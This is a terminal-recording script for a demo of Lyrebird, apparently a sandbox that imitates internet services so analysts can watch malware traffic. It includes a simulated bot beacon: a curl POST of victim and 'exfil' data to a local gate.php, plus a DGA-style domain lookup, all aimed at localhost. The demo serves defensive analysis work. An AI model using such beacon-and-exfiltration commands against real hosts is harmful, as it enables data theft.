# Lyrebird demo — render with:  vhs demo/lyrebird.tape   (from the repo root)
# Produces docs/assets/demo.gif. Prerequisites: vhs, and a working lyrebird
# runtime (python deps installed) plus curl, dig, jq. See demo/README.md.
#
# The "sample" here is a benign curl/dig standing in for malware — Lyrebird only
# observes; it never executes anything.

Output docs/assets/demo.gif

Set Shell "bash"
Set Theme "Catppuccin Mocha"
Set FontSize 18
Set Width 1320
Set Height 820
Set Padding 22
Set TypingSpeed 45ms

# ---- setup (not recorded) ----
Hide
Type "export PS1='$ '"
Enter
Type "export PYTHONPATH=src PYTHONUNBUFFERED=1"
Enter
Type "rm -rf demo/.labdata && clear"
Enter
Show

# ---- 1. stand up the fake-internet lab ----
Type "# 1. Stand up the lab — fake-but-believable services on localhost"
Enter
Type "python -m lyrebird --config demo/lyrebird.demo.yaml &"
Enter
Sleep 3s

# ---- 2. a malware sample checks in over HTTP (POST body = candidate exfil) ----
Type "# 2. A 'sample' checks in over HTTP — a POST body is a candidate exfil/beacon"
Enter
Type "curl -s http://localhost:8080/gate.php -d 'id=bot1&host=victim&data=ZXhmaWw='; echo"
Enter
Sleep 2s

# ---- 3. ...and resolves a DGA-style domain, plus a benign one for contrast ----
Type "# 3. ...then resolves a DGA-style domain (long random label) and a benign one"
Enter
Type "dig +short @127.0.0.1 -p 8053 kq8s7d0fj3nx7zz19a2bdek.example"
Enter
Sleep 1s
Type "dig +short @127.0.0.1 -p 8053 windowsupdate.microsoft.com"
Enter
Sleep 1500ms

# ---- 4. the payoff: structured JSONL, detections firing as tags ----
Type "# 4. Every interaction is structured JSONL — detections fire as tags"
Enter
Type "jq -C '{service, summary, tags}' demo/.labdata/events/demo.jsonl"
Enter
Sleep 4s

# ---- tear down ----
Type "kill %1   # stop the lab"
Enter
Sleep 2s
